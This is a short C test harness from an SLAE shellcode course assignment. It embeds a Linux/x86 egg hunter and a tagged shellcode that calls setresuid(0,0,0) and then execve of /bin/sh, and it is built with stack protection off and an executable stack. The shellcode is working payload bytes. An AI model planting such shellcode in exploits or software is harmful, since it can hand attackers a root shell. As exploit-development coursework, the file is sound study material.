/*
 *      SLAE - Assignment #3: Egg Hunter Shellcode (Linux/x86)
 *      Author: Alain Menelet 
 *      StudentID - SLAE-3763
 *      HowTo: gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char egg[] = \
"\xeb\x0d\x58\xbb\xb3\x3f\xb3\x3f\x40\x39\x18\x75\xfb\xff\xe0\xe8\xee\xff\xff\xff";

unsigned char shellcode[] = \
"\xb3\x3f\xb3\x3f"	// EggKey
"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	printf("Taille de l'Egg Hunter %d\nAdresse du Shellcode:%p\n", strlen(egg), shellcode);
	int (*ret)() = (int(*)())egg;
	ret();

return 0;
}
